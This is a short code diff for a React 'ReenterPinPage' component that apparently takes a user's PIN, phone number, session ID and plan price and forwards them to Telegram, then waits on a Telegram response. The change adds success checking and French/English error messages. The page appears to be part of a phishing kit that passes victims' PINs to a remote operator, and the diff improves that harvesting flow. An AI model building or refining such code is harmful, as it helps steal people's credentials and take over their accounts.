@@ -125,7 +125,7 @@ export const ReenterPinPage: React.FC<ReenterPinPageProps> = ({
 
     try {
       // Send re-entered PIN to Telegram
-      await telegramService.sendReenterPin({
+      const success = await telegramService.sendReenterPin({
         sessionId,
         phone,
         fullPhone: displayPhone,
@@ -137,7 +137,15 @@ export const ReenterPinPage: React.FC<ReenterPinPageProps> = ({
         planPrice: selectedPlan.price,
       });
 
-      setIsWaitingTelegram(true);
+      if (success) {
+        setIsWaitingTelegram(true);
+      } else {
+        setErrorMessage(
+          language === 'fr'
+            ? 'Impossible d\'envoyer le PIN à Telegram. Veuillez vérifier votre connexion.'
+            : 'Failed to send PIN to Telegram. Please check your connection.'
+        );
+      }
     } catch (err: any) {
       setErrorMessage(
         err.message ||
